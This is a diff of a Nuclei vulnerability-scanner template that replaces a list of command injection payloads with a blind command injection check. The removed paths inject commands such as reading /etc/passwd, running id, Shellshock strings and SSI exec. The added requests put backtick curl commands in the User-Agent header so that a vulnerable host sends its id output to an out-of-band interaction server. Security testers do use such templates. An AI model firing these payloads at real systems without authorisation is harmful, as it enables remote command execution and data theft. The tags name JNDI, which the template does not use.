@@ -1,42 +1,50 @@
-id: cmd
+id: blind-command-injection-dk4trin
 
 info:
-  name: Command Injection
-  author: pikpikcu
+  name: dk4trin Blind Command Injection
+  author: dk4trin
   severity: high
+  description: Command Injection Blind
+  tags: rce,jndi,oast,blind,command,injection
 
-http:
-  - method: GET
-    path:
-      - "{{BaseURL}}&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
-      - "{{BaseURL}}&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
-      - "{{BaseURL}}&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; "
-      - "{{BaseURL}};cat+/etc/passwd"
-      - "{{BaseURL}};id;"
-      - "{{BaseURL}};id"
-      - "{{BaseURL}};netstat -a;"
-      - "{{BaseURL}};system('cat%20/etc/passwd')"
-      - "{{BaseURL}}%0Acat /etc/passwd"      
-      - "{{BaseURL}}%0A/usr/bin/id"
-      - "{{BaseURL}}%0Aid"
-      - "{{BaseURL}}%0a id %0a"
-      - "{{BaseURL}}`id`"
-      - "{{BaseURL}};cat+/etc/hosts"
-      - "{{BaseURL}}cat /etc/hosts"
-      - "{{BaseURL}};cat /etc/hosts"
-      - "{{BaseURL}}<?php system('cat /etc/passwd');?>"
-      - "{{BaseURL}}eval('whoami')"
-      - "{{BaseURL}}| pwd"
-      - "{{BaseURL}}() { :;}; echo www-data"
-      - "{{BaseURL}}() { :;};whoami"
-      - "{{BaseURL}}(){ :;};+id"
-      - "{{BaseURL}}(++){:%:};cat+/etc/passwd"
-      - "{{BaseURL}}<!--#exec cmd='/usr/bin/id;-->' " 
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: `curl - v {{interactsh-url}}$(id)`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: `curl - v {{interactsh-url}}.$(id)`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: `curl - v $(id){{interactsh-url}}`
+
+      - |
+        GET / HTTP/1.1
+        Host: {{hostname}}
+        User-Agent: `curl - v $(id).{{interactsh-url}}$(id)`
+
+
+    matchers-condition: and
     matchers:
+      - type: word
+        part: interactsh_protocol  # Confirms the DNS Interaction
+        words:
+          - "dns"
+
       - type: regex
+        part: interactsh_request
         regex:
-          - "root:[x*]:0:0:"
-          - "www-data"
-          - "localhost"   
-        part: body
-     
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Match for extracted ${hostName} variable
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'   # Print extracted ${hostName} in output
